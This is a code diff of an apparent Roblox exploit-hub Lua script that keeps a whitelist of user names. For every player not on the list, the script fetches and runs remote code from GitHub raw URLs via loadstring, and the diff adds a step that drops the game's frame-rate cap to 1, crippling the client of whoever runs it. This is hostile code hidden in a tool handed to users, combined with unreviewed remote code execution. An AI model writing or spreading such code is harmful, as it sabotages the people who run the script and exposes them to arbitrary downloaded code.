@@ -50,6 +50,7 @@ if not getgenv().bytehubLoaded then
 	"minerscraftdupedemon",
 	"MinersCraftPro9999",
 	"werewareikyouseethis",
+	"scyphicxv",
     "Epicguy_616161"
   }
 
@@ -110,7 +111,16 @@ if not getgenv().bytehubLoaded then
   
   if not table.find(whitelist, player.Name) then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/screengui/bytehub/refs/heads/main/Byte%20Hub/BSAdmin",true))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/screengui/bytehub/refs/heads/main/Byte%20Hub/BSAdminHelper",true))()  
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/screengui/bytehub/refs/heads/main/Byte%20Hub/BSAdminHelper",true))()
+	setfpscap(60)
+    wait(5)
+	setfpscap(30)
+    wait(5)
+	setfpscap(15)
+	wait(5)
+	setfpscap(5)
+    wait(5)
+	setfpscap(1)
   end
 
   --[[_G.ArmorAntiLag = game.Players.LocalPlayer.PlayerGui.HUDGui.Inventory.Mirror.VPFrame[""].ChildAdded:Connect(function(child)
